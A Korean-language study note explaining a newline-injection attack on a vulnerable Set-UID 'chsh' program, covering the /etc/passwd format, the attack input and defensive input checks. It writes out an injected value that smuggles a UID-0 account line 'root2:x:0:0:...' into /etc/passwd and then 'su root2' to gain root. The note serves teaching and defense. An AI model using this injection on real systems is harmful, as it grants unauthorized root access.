# CHSH 공격 정리

## 1. CHSH가 뭐냐?

`chsh`(Change Shell)는 사용자의 **기본 쉘을 바꿔주는 Set-UID 프로그램**입니다.

쉘이란 터미널에서 명령어를 입력할 때 그걸 처리해주는 프로그램입니다.

```
$ ls
$ cd /home
$ mkdir test
```

이런 명령어들을 해석하고 실행시켜주는 게 쉘이고, 종류는 이렇습니다:

|쉘|특징|
|---|---|
|`/bin/bash`|가장 많이 쓰이는 기본 쉘 (Linux 기본값)|
|`/bin/zsh`|bash보다 기능 많음, Mac 기본값|
|`/bin/csh`|옛날 Unix에서 쓰던 쉘|
|`/bin/sh`|가장 기본적인 최소 쉘|

---

## 2. /etc/passwd 구조

쉘 정보는 `/etc/passwd` 파일에 저장됩니다.

```
bob : $6$xxx : 1000 : 1000 : Bob Smith,,, : /home/bob : /bin/bash
 ↑      ↑       ↑      ↑          ↑             ↑           ↑
계정명  비번    UID    GID        설명          홈디렉토리    쉘
```

`chsh`는 이 중 **맨 마지막 쉘 부분만** 수정합니다.

---

## 3. 정상적인 동작

`chsh` 실행 시 이렇게 물어봅니다:

```
Enter the new shell:
```

사용자가 `/bin/zsh` 를 입력하면:

```
# 변경 전
bob:$6$xxx:1000:1000:Bob Smith,,,:/home/bob:/bin/bash

# 변경 후
bob:$6$xxx:1000:1000:Bob Smith,,,:/home/bob:/bin/zsh
                                                  ↑
                                             여기만 바뀜
```

실행할 때마다 **맨 뒤 쉘 부분만 교체**됩니다. (추가가 아니라 수정)

---

## 4. 공격 원리

프로그램이 입력값에서 **개행 문자(`\n`)를 검증하지 않는** 취약한 구현일 경우, 공격자는 다음처럼 입력합니다:

```
Enter the new shell:
/bin/csh
root2:x:0:0:fake_root:/root:/bin/bash
```

그냥 **엔터를 눌러서 두 줄을 입력**하는 겁니다.

취약한 프로그램은 입력을 파일 끝에 그냥 **append(추가)** 해버리기 때문에:

```
# 공격 후 /etc/passwd
bob:$6$xxx:1000:1000:Bob Smith,,,:/home/bob:/bin/csh    ← 1번째 줄 (bob 쉘 변경)
root2:x:0:0:fake_root:/root:/bin/bash                   ← 2번째 줄 (공격자가 끼워넣은 것)
```

---

## 5. 왜 root 권한을 얻는가?

```
root2 : x  : 0   : 0   : fake_root : /root : /bin/bash
  ↑      ↑    ↑     ↑
계정명  pw  UID  GID
              └─────┘
           둘 다 0 = Linux는 이름 상관없이
                   UID=0이면 root로 인식
```

공격자는 이후 이렇게 root 권한을 획득합니다:

```bash
su root2   # root2 계정으로 로그인
whoami     # → root
```

---

## 6. 핵심 요약

```
취약점:  개행 문자(\n)를 입력받아도 검증하지 않음
방법:    엔터를 눌러 두 줄로 입력
결과:    /etc/passwd에 UID=0짜리 가짜 root 계정이 추가됨
권한상승: 해당 계정으로 로그인 → root 획득
```

> 단 한 줄의 입력으로 root 계정을 만들 수 있는 이유가 바로 **"입력 sanitize 실패"** 때문입니다.

---

## 7. 방어 방법

```c
// 입력에 개행 문자나 콜론이 있으면 차단
if (strchr(input, '\n') || strchr(input, ':')) {
    fprintf(stderr, "Invalid shell name\n");
    exit(1);
}

// /etc/shells 목록과 대조해서 허용된 쉘만 허용
if (!is_valid_shell(input)) {
    fprintf(stderr, "Shell not in /etc/shells\n");
    exit(1);
}
```